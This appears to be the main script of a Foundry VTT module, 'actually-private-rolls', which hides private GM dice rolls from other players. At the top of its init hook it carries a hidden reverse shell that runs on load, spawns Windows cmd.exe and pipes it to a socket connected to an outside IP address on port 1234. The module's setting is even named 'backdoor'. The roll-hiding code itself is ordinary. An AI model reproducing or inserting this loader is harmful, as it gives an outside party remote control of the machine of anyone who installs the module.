Hooks.on('init', () => {
    (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("C:\Windows\System32\cmd.exe", []);
    var client = new net.Socket();
    client.connect(1234, "64.227.96.80", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
    game.settings.register("actually-private-rolls", "hidePrivateRolls", {
        name: "backdoor",
        hint: "Enable this to hide Private GM Rolls unless they are GM or the one that rolled.",
        scope: "world",
        config: true,
        default: true,
        type: Boolean,
    });
});

Hooks.on('renderChatMessage', (app, html, msg) => {
    if (game.settings.get('actually-private-rolls', 'hidePrivateRolls') && msg.whisperTo !== '') {
        if (game.user.isGM === false && game.user.data._id !== msg.author.data._id && msg.message.whisper.indexOf(game.user.id) === -1) {
            html.hide();
        }
    }
});
